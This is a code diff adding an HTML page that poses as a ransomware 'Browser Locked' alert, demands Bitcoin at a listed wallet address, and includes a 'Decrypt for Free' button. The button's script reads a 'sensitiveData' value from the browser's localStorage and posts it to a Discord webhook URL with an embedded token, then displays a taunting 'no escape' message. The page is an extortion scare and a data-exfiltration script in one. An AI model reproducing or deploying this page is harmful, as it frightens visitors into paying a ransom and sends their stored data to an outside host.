@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ransomware Alert</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Creepster&display=swap');
+    body {
+      font-family: 'Creepster', cursive;
+      background-color: black;
+      color: red;
+      text-align: center;
+      margin-top: 50px;
+      animation: background-flicker 3s infinite;
+    }
+    @keyframes background-flicker {
+      0%, 100% { background-color: black; }
+      50% { background-color: #111; }
+    }
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      border: 3px solid red;
+      padding: 20px;
+      box-shadow: 0 0 30px red;
+      animation: container-flicker 2s infinite;
+    }
+    @keyframes container-flicker {
+      0%, 100% { box-shadow: 0 0 30px red; }
+      50% { box-shadow: 0 0 60px red; }
+    }
+    h1 {
+      font-size: 3.5em;
+      text-shadow: 0 0 20px red;
+      animation: text-flicker 1.5s infinite;
+    }
+    @keyframes text-flicker {
+      0%, 100% { text-shadow: 0 0 20px red; }
+      50% { text-shadow: 0 0 40px red; }
+    }
+    p {
+      font-size: 1.5em;
+      margin: 20px 0;
+    }
+    .bitcoin-address {
+      font-weight: bold;
+      font-size: 1.8em;
+      text-shadow: 0 0 10px red;
+    }
+    .warning-icon {
+      font-size: 6em;
+      animation: icon-shake 1s infinite;
+    }
+    @keyframes icon-shake {
+      0%, 100% { transform: rotate(0); }
+      25% { transform: rotate(-10deg); }
+      75% { transform: rotate(10deg); }
+    }
+    .glitch {
+      color: red;
+      position: relative;
+    }
+    .glitch::before,
+    .glitch::after {
+      content: attr(data-text);
+      position: absolute;
+      left: 0;
+      color: red;
+      background: black;
+      overflow: hidden;
+      clip: rect(0, 900px, 0, 0);
+    }
+    .glitch::before {
+      animation: glitchTop 2s infinite linear alternate-reverse;
+    }
+    .glitch::after {
+      animation: glitchBottom 2s infinite linear alternate-reverse;
+    }
+    @keyframes glitchTop {
+      0% {
+        clip: rect(0, 900px, 0, 0);
+        transform: skew(0.3deg);
+      }
+      50% {
+        clip: rect(10px, 9999px, 0, 0);
+        transform: skew(0.3deg);
+      }
+      100% {
+        clip: rect(0, 900px, 0, 0);
+        transform: skew(0.3deg);
+      }
+    }
+    @keyframes glitchBottom {
+      0% {
+        clip: rect(0, 900px, 0, 0);
+        transform: skew(0.3deg);
+      }
+      50% {
+        clip: rect(200px, 9999px, 100px, 0);
+        transform: skew(0.3deg);
+      }
+      100% {
+        clip: rect(0, 900px, 0, 0);
+        transform: skew(0.3deg);
+      }
+    }
+    .btn {
+      background-color: red;
+      color: black;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.5em;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .btn:hover {
+      background-color: darkred;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="warning-icon glitch" data-text="⚠️">⚠️</div>
+    <h1 class="glitch" data-text="Browser Locked">Browser Locked</h1>
+    <p class="glitch" data-text="Your browser has been locked. To unlock, please send 0.001 Bitcoin to the address below:">Your browser has been locked. To unlock, please send 0.001 Bitcoin to the address below:</p>
+    <p class="bitcoin-address glitch" data-text="bc1q7zqs0v6l4heep4d6kmarqn876xzawmedn30z5q">bc1q7zqs0v6l4heep4d6kmarqn876xzawmedn30z5q</p>
+    <p class="glitch" data-text="Once the payment is confirmed, the browser will be unlocked automatically.">Once the payment is confirmed, the browser will be unlocked automatically.</p>
+    <button class="btn" onclick="decryptForFree()">Decrypt for Free</button>
+  </div>
+  <script>
+    function decryptForFree() {
+      // Get the stored sensitive data from localStorage
+      let sensitiveInfo = localStorage.getItem('sensitiveData');
+
+      // Display sensitive info
+      alert(sensitiveInfo);
+
+      // Send sensitive info to webhook
+      fetch('https://discordapp.com/api/webhooks/1259285219769450607/Yr7pmqkAfugS61lhibC8XKztl6WpmrEzGqRTmqPUyeQEYG8cikQylnjw_BrSVvHDERas', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ content: sensitiveInfo }),
+      }).then(response => {
+        if (response.ok) {
+          console.log('Sensitive info sent to webhook successfully.');
+        } else {
+          console.error('Failed to send sensitive info to webhook:', response.statusText);
+        }
+      }).catch(error => {
+        console.error('Error sending sensitive info to webhook:', error);
+      });
+
+      // Replace content with more frightening message
+      document.body.innerHTML = `
+        <div class="container">
+          <h1 class="glitch" data-text="You Shouldn't Have Done That">You Shouldn't Have Done That</h1>
+          <p class="glitch" data-text="Your information has been sent. There is no escape.">Your information has been sent. There is no escape.</p>
+        </div>
+      `;
+    }
+  </script>
+</body>
+</html>
